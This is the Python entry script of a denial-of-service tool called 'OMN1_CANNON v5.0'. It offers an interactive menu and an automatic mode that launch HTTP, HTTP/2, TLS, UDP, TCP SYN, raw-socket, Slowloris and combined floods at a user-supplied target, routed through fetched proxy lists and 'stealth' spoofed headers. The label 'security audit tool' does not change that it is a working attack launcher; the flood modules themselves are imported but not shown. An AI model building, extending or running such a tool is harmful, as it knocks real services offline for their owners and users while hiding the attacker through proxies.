import argparse
import asyncio

# === Importing attack modules ===
from core.http2_flood import http2_flood
from core.http_flood import http_flood
from core.tls_flood import tls_flood
from core.udp_flood import udp_flood
from core.raw_socket import raw_socket_flood
from core.tcp_syn import tcp_syn_flood
from core.slowloris import slowloris_attack
from core.combo_runner import run_combo_attack

# === Importing utilities ===
from utils.banner import print_banner
from utils.logger import log_event
from utils.proxy_api import fetch_proxy_list
from utils.stealth import generate_stealth_headers

def run_manual_mode():
    """Interactive CLI menu for selecting attack mode manually."""
    print_banner()
    print("\n📌 Select attack mode:")
    print("1. HTTP/1.1 Flood")
    print("2. HTTP/2 Flood")
    print("3. TLS Flood")
    print("4. UDP Flood")
    print("5. TCP SYN Flood")
    print("6. RAW Socket Flood")
    print("7. Slowloris")
    print("8. Combo Mode (run all)")
    print("9. Exit")

    choice = input("Enter option number: ").strip()
    target = input("Target IP or URL (e.g., https://example.com or 1.2.3.4): ").strip()
    threads = int(input("Number of threads: ").strip())

    # Load proxies and spoofed headers
    proxies = fetch_proxy_list()
    headers = generate_stealth_headers()

    try:
        if choice == "1":
            asyncio.run(http_flood(target, threads, proxies, headers))
        elif choice == "2":
            asyncio.run(http2_flood(target, threads, proxies, headers))
        elif choice == "3":
            asyncio.run(tls_flood(target, threads, proxies, headers))
        elif choice == "4":
            asyncio.run(udp_flood(target, threads))
        elif choice == "5":
            asyncio.run(tcp_syn_flood(target, threads))
        elif choice == "6":
            asyncio.run(raw_socket_flood(target, threads))
        elif choice == "7":
            asyncio.run(slowloris_attack(target, threads, proxies, headers))
        elif choice == "8":
            asyncio.run(run_combo_attack(target, threads, proxies, headers))
        elif choice == "9":
            print("Exiting OMN1_CANNON.")
            return
        else:
            print("Invalid option. Please try again.")
    except Exception as e:
        log_event(f"[!] Error: {e}")

def run_auto_mode(target):
    """Fully automated audit mode - runs all attacks in sequence."""
    print_banner()
    print(f"🔍 Starting automatic audit mode for target: {target}")

    # Load shared configurations
    proxies = fetch_proxy_list()
    headers = generate_stealth_headers()
    threads = 50

    try:
        asyncio.run(http_flood(target, threads, proxies, headers))
        asyncio.run(http2_flood(target, threads, proxies, headers))
        asyncio.run(tls_flood(target, threads, proxies, headers))
        asyncio.run(udp_flood(target, threads))
        asyncio.run(tcp_syn_flood(target, threads))
        asyncio.run(slowloris_attack(target, threads, proxies, headers))
        asyncio.run(run_combo_attack(target, threads, proxies, headers))
    except Exception as e:
        log_event(f"[AUTO MODE ERROR] {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="OMN1_CANNON v5.0 - Interactive Security Audit Tool")
    parser.add_argument("--auto", help="Run in automatic mode (test all vectors)", action="store_true")
    parser.add_argument("--target", help="Target URL or IP address for audit")
    args = parser.parse_args()

    if args.auto and args.target:
        run_auto_mode(args.target)
    else:
        run_manual_mode()
